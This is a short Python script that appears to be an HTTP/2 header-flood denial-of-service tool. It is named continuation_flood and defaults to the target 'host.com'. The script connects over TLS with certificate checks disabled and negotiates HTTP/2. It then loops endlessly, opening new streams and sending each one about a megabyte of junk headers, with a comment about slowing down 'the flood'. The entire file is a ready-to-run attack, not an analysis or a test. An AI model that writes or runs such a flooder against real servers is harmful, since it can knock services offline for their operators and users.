import socket
import ssl
from h2 import connection, config


def continuation_flood(host='host.com', port=443):
    try:
        sock = socket.create_connection((host, port))

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(['h2'])
        ctx.set_ciphers('ALL:@SECLEVEL=1')
        ctx.minimum_version = ssl.TLSVersion.TLSv1_3


        sock = ctx.wrap_socket(sock, server_hostname=host)
        print(f"ALPN negotiated protocol: {sock.selected_alpn_protocol()}")

        cfg = config.H2Configuration(client_side=True)
        conn = connection.H2Connection(config=cfg)
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())  # Send preface immediately

        headers = [
            (':method', 'GET'),
            (':authority', host),
            (':path', '/'),
            (':scheme', 'https')
        ]
        headers.extend([('flood', 'X' * 1000)] * 1000)  # Flood with large headers

        while True:
            stream_id = conn.get_next_available_stream_id()
            conn.send_headers(stream_id, headers, end_stream=True)
            sock.sendall(conn.data_to_send())
            print(f"Sent headers on stream {stream_id}")
            #time.sleep(0.1)  # slow down the flood

    except ssl.SSLError as e:
        print(f'SSL error: {e}')
    except socket.error as e:
        print(f'Socket error: {e}')


if __name__ == "__main__":
    continuation_flood()
